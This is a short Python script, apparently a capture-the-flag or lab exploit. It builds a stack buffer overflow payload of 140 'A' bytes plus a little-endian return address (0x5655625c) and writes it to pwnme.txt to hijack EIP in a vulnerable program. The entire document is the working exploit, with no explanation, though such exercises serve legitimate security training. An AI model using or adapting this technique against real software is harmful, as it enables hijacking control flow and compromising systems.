#!/usr/bin/env python3

import os;

# 0x5655625c
eip="\x5c\x62\x55\x56"
shellcode = "A"*140+eip
f = open("pwnme.txt","w")
f.write(shellcode)
f.close()
